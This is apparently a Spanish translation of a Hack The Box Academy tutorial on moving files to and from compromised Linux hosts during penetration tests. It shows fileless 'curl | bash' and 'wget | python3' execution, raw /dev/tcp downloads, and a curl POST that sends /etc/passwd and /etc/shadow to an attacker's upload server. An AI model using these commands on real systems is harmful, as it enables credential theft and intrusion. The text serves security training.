Linux es un sistema operativo versátil, que comúnmente tiene muchas herramientas diferentes que podemos usar para realizar transferencias de archivos. Comprender los métodos de transferencia de archivos en Linux puede ayudar tanto a atacantes como a defensores a mejorar sus habilidades para atacar redes y prevenir ataques sofisticados.

Hace unos años, nos contactaron para realizar una respuesta a incidentes en algunos servidores web. Encontramos múltiples actores de amenazas en seis de los nueve servidores web que investigamos. El actor de la amenaza encontró una vulnerabilidad de inyección SQL. Usaron un script de Bash que, al ejecutarse, intentaba descargar otra pieza de malware que se conectaba al servidor de comando y control del actor de la amenaza.

El script de Bash que utilizaron intentó tres métodos de descarga para obtener la otra pieza de malware que se conectaba al servidor de comando y control. Su primer intento fue usar `cURL`. Si eso fallaba, intentaba usar `wget`, y si eso fallaba, usaba `Python`. Los tres métodos utilizan `HTTP` para comunicarse.

Aunque Linux puede comunicarse a través de FTP, SMB como Windows, la mayoría del malware en todos los sistemas operativos diferentes utiliza `HTTP` y `HTTPS` para la comunicación.

Esta sección revisará múltiples formas de transferir archivos en Linux, incluyendo HTTP, Bash, SSH, etc.

---
## Download Operations

Tenemos acceso a la máquina `NIX04`, y necesitamos descargar un archivo desde nuestra máquina `Pwnbox`. Veamos cómo podemos lograr esto utilizando múltiples métodos de descarga de archivos.

![image](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)

## Base64 Encoding / Decoding

Dependiendo del tamaño del archivo que queremos transferir, podemos usar un método que no requiera comunicación de red. Si tenemos acceso a un terminal, podemos codificar un archivo en una cadena base64, copiar su contenido en el terminal y realizar la operación inversa. Veamos cómo podemos hacer esto con Bash.

### Pwnbox - Check File MD5 hash

```r
md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Usamos `cat` para imprimir el contenido del archivo y codificamos la salida en base64 usando una pipe `|`. Usamos la opción `-w 0` para crear solo una línea y terminamos el comando con un punto y coma (;) y la palabra clave `echo` para comenzar una nueva línea y facilitar la copia.

### Pwnbox - Encode SSH Key to Base64

```r
cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

Copiamos este contenido, lo pegamos en nuestra máquina objetivo Linux y usamos `base64` con la opción `-d' para decodificarlo.

### Linux - Decode the File

```r
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXV

lQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Finalmente, podemos confirmar si el archivo se transfirió correctamente usando el comando `md5sum`.

### Linux - Confirm the MD5 Hashes Match

```r
md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

**Nota:** También puedes subir archivos utilizando la operación inversa. Desde tu objetivo comprometido, usa cat y base64 para codificar un archivo y decodifícalo en tu Pwnbox.

## Web Downloads with Wget and cURL

Dos de las utilidades más comunes en las distribuciones de Linux para interactuar con aplicaciones web son `wget` y `curl`. Estas herramientas están instaladas en muchas distribuciones de Linux.
Para descargar un archivo usando `wget`, necesitamos especificar la URL y la opción `-O' para establecer el nombre del archivo de salida.

### Download a File Using wget

```r
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL` es muy similar a `wget`, pero la opción de nombre del archivo de salida es en minúsculas `-o'.

### Download a File Using cURL

```r
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

---

## Fileless Attacks Using Linux

Debido a la forma en que funciona Linux y cómo operan las [pipes](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), la mayoría de las herramientas que usamos en Linux se pueden usar para replicar operaciones sin archivos, lo que significa que no tenemos que descargar un archivo para ejecutarlo.

**Nota:** Algunos payloads como `mkfifo` escriben archivos en el disco. Ten en cuenta que aunque la ejecución del payload puede ser sin archivos cuando usas una pipe, dependiendo del payload elegido, puede crear archivos temporales en el sistema operativo.

Tomemos el comando `cURL` que usamos, y en lugar de descargar LinEnum.sh, ejecutémoslo directamente usando una pipe.

### Fileless Download with cURL

```r
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

De manera similar, podemos descargar un archivo de script de Python desde un servidor web y canalizarlo al binario de Python. Hagámoslo, esta vez usando `wget`.

### Fileless Download with wget

```r
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

---

## Download with Bash (/dev/tcp)

También puede haber situaciones en las que ninguna de las herramientas de transferencia de archivos conocidas esté disponible. Siempre que Bash versión 2.04 o superior esté instalado (compilado con --enable-net-redirections), el archivo de dispositivo incorporado /dev/TCP se puede usar para descargas de archivos simples.

### Connect to the Target Webserver

```r
exec 3<>/dev/tcp/10.10.10.32/80
```

### HTTP GET Request

```r
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### Print the Response

```r
cat <&3
```

---

## SSH Downloads

SSH (o Secure Shell) es un protocolo que permite el acceso seguro a computadoras remotas. La implementación de SSH viene con una utilidad `SCP` para transferencia de archivos remota que, por defecto, usa el protocolo SSH.

`SCP` (secure copy) es una utilidad de línea de comandos que permite copiar archivos y directorios entre dos hosts de manera segura. Podemos copiar nuestros archivos desde servidores locales a remotos y desde servidores remotos a nuestra máquina local.

`SCP` es muy similar a `copy` o `cp`, pero en lugar de proporcionar una ruta local, necesitamos especificar un nombre de usuario, la dirección IP remota o el nombre DNS, y las credenciales del usuario.

Antes de comenzar a descargar archivos desde nuestra máquina objetivo Linux a nuestra Pwnbox, configuremos un servidor SSH en nuestra Pwnbox.

### Enabling the SSH Server

```r
sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

### Starting the SSH Server

```r
sudo systemctl start ssh
```

### Checking for SSH Listening Port

```r
netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Ahora podemos comenzar a transferir archivos. Necesitamos especificar la dirección IP de nuestra Pwnbox y el nombre de usuario y contraseña.

### Linux - Downloading Files Using SCP

```r
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

**Nota:** Puedes crear una cuenta de usuario temporal para transferencias de archivos y evitar usar tus credenciales o claves principales en una computadora remota.

---

## Upload Operations

También hay situaciones como la explotación de binarios y el análisis de capturas de paquetes, donde debemos subir archivos desde nuestra máquina objetivo a nuestro host de ataque. Los métodos que usamos para las descargas también funcionarán para las cargas. Veamos cómo podemos subir archivos de varias maneras.

---

## Web Upload

Como se mencionó en la sección `Windows File Transfer Methods`, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver), un módulo extendido del módulo `HTTP.Server` de Python, que incluye una página de carga de archivos. Para este ejemplo de Linux, veamos cómo podemos configurar el módulo `uploadserver` para usar `HTTPS` para una comunicación segura.

Lo primero que necesitamos hacer es instalar el módulo `uploadserver`.

### Pwnbox - Start Web Server

```r
sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Ahora necesitamos crear un certificado. En este ejemplo, estamos usando un certificado autofirmado.

### Pwnbox - Create a Self-Signed Certificate

```r
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

El servidor web no debe alojar el certificado. Recomendamos crear un nuevo directorio para alojar el archivo para nuestro servidor web.

### Pwnbox - Start Web Server

```r
mkdir https && cd https
```

```r
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Ahora desde nuestra máquina comprometida

, subamos los archivos `/etc/passwd` y `/etc/shadow`.

### Linux - Upload Multiple Files

```r
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Usamos la opción `--insecure` porque usamos un certificado autofirmado que confiamos.

---

## Alternative Web File Transfer Method

Dado que las distribuciones de Linux generalmente tienen `Python` o `php` instalados, iniciar un servidor web para transferir archivos es sencillo. Además, si el servidor que comprometimos es un servidor web, podemos mover los archivos que queremos transferir al directorio del servidor web y acceder a ellos desde la página web, lo que significa que estamos descargando el archivo desde nuestra Pwnbox.

Es posible levantar un servidor web usando varios lenguajes. Una máquina Linux comprometida puede no tener un servidor web instalado. En tales casos, podemos usar un mini servidor web. Lo que tal vez carezcan de seguridad, lo compensan en flexibilidad, ya que la ubicación del webroot y los puertos de escucha se pueden cambiar rápidamente.

### Linux - Creating a Web Server with Python3

```r
python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Linux - Creating a Web Server with Python2.7

```r
python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Linux - Creating a Web Server with PHP

```r
php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

### Linux - Creating a Web Server with Ruby

```r
ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

### Download the File from the Target Machine onto the Pwnbox

```r
wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```

**Nota:** Cuando iniciamos un nuevo servidor web usando Python o PHP, es importante considerar que el tráfico entrante puede estar bloqueado. Estamos transfiriendo un archivo desde nuestro objetivo a nuestro host de ataque, pero no estamos subiendo el archivo.

---

## SCP Upload

Podemos encontrar algunas empresas que permiten el `SSH protocol` (TCP/22) para conexiones salientes, y si ese es el caso, podemos usar un servidor SSH con la utilidad `scp` para subir archivos. Intentemos subir un archivo a la máquina objetivo usando el protocolo SSH.

### File Upload using SCP

```r
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd                                                                                                           100% 3414     6.7MB/s   00:00
```

**Nota:** Recuerda que la sintaxis de scp es similar a cp o copy.

---

## Onwards

Estos son los métodos de transferencia de archivos más comunes utilizando herramientas integradas en sistemas Linux, pero hay más. En las siguientes secciones, discutiremos otros mecanismos y herramientas que podemos usar para realizar operaciones de transferencia de archivos.